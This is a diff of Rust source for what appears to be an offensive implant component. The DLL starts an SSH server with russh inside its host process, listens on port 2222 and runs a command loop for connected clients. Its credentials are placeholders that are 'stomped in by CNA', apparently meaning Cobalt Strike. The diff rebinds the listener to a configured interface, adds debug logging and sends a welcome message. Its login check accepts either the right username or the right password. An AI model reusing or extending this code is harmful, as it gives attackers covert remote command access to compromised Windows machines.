@@ -1,37 +1,20 @@
 #![no_main]
 #![allow(dead_code)]
-#![crate_type = "cdylib"]
 
 use std::collections::HashMap;
-use std::io::Read;
 use std::os::raw::c_void;
 use windows_sys::Win32::Foundation::{BOOL, HANDLE};
 
 use std::sync::Arc;
 
 use rand_core::OsRng;
-use russh::keys::*;
-use russh::server::{Msg, RunningSession, Server as _, Session};
+use russh::server::{Msg, Server as _, Session};
 use russh::*;
 use tokio::sync::Mutex;
 
-/// Placeholder strings get stomped in by CNA in release mode
-#[cfg(not(debug_assertions))]
-pub static USERNAME: &[u8; 64] =
-    b"_________PLACEHOLDER_USERNAME_STRING_PLS_DO_NOT_CHANGE__________";
-#[cfg(not(debug_assertions))]
-pub static PASSWORD: &[u8; 64] =
-    b"_________PLACEHOLDER_PASSWORD_STRING_PLS_DO_NOT_CHANGE__________";
-
-#[cfg(debug_assertions)]
-pub static USERNAME: &[u8; 10] = b"username\0\0";
-#[cfg(debug_assertions)]
-pub static PASSWORD: &[u8; 10] = b"password\0\0";
+pub use scepter_common::*;
 
 pub async fn dll_main() {
-    env_logger::builder()
-        .filter_level(log::LevelFilter::Debug)
-        .init();
 
     let config = russh::server::Config {
         inactivity_timeout: Some(std::time::Duration::from_secs(3600)),
@@ -50,7 +33,10 @@ pub async fn dll_main() {
         clients: Arc::new(Mutex::new(HashMap::new())),
         id: 0,
     };
-    sh.run_on_address(config, ("0.0.0.0", 2222)).await.unwrap();
+
+    let interface_ip = String::from_utf8_lossy(SSH_INTERFACE_IPV4_ADDRESS).to_string().trim_matches(char::from(0)).to_string();
+
+    sh.run_on_address(config, (interface_ip, 2222)).await.unwrap();
 }
 
 #[derive(Clone)]
@@ -62,12 +48,16 @@ struct Server {
 impl Server {
     pub async fn post(&mut self, data: CryptoVec) {
         let mut clients = self.clients.lock().await;
+        println!("Broadcasting to {} clients", clients.len());
         for (id, (channel, s)) in clients.iter_mut() {
-            if *id != self.id {
-                let _ = s.data(*channel, data.clone()).await;
+            println!("Sending to client {}", id);
+            match s.data(*channel, data.clone()).await {
+                Ok(_) => println!("Successfully sent to client {}", id),
+                Err(e) => println!("Failed to send to client {}: {:?}", id, e),
             }
         }
     }
+
     
     pub async fn command_loop(&mut self) {
         loop {
@@ -86,8 +76,12 @@ impl Server {
 impl server::Server for Server {
     type Handler = Self;
     fn new_client(&mut self, _: Option<std::net::SocketAddr>) -> Self {
-        let s = self.clone();
-        self.id += 1;
+        let id = self.id;
+        self.id += 1; // Increment ID for next client
+
+        let mut s = self.clone();
+        s.id = id; // Set this handler's ID
+        println!("New client connection with ID: {}", id);
         s
     }
     fn handle_session_error(&mut self, _error: <Self::Handler as russh::server::Handler>::Error) {
@@ -100,19 +94,17 @@ impl server::Handler for Server {
 
     async fn auth_password(&mut self, user: &str, pass: &str) -> Result<server::Auth, Self::Error> {
         // Believe it or not, this is military-grade security
-        let username = String::from_utf8_lossy(&*USERNAME);
-        let username = username.trim_end_matches('\0');
+        let username = String::from_utf8_lossy(&*USERNAME).to_string().trim_matches(char::from(0)).to_string();
 
-        let password = String::from_utf8_lossy(&*PASSWORD);
-        let password = password.trim_end_matches('\0');
+        let password = String::from_utf8_lossy(&*PASSWORD).to_string().trim_matches(char::from(0)).to_string();
 
-        let input_username = String::from_utf8_lossy(user.as_bytes());
-        let input_password = String::from_utf8_lossy(pass.as_bytes());
+        let input_username = String::from_utf8_lossy(user.as_bytes()).to_string().trim_matches(char::from(0)).to_string();
+        let input_password = String::from_utf8_lossy(pass.as_bytes()).to_string().trim_matches(char::from(0)).to_string();
 
         if input_username.eq(&username) || input_password.eq(&password) {
             let mut self_clone = self.clone();
 
-            // Spawn the command loop in a new task
+            // Spawn the command loop
             tokio::spawn(async move {
                 self_clone.command_loop().await;
             });
@@ -128,10 +120,21 @@ impl server::Handler for Server {
         channel: Channel<Msg>,
         session: &mut Session,
     ) -> Result<bool, Self::Error> {
-        {
-            let mut clients = self.clients.lock().await;
-            clients.insert(self.id, (channel.id(), session.handle()));
+        println!("Client {} opened a session channel with ID: {}", self.id, channel.id());
+
+        // Store client in the HashMap
+        let mut clients = self.clients.lock().await;
+        clients.insert(self.id, (channel.id(), session.handle()));
+
+        println!("Client registered. Total clients: {}", clients.len());
+        for (id, _) in clients.iter() {
+            println!("  Client ID: {}", id);
         }
+
+        // Send initial welcome message
+        let welcome = CryptoVec::from("Connection established. Waiting for shell request.\r\n");
+        session.data(channel.id(), welcome)?;
+
         Ok(true)
     }
 
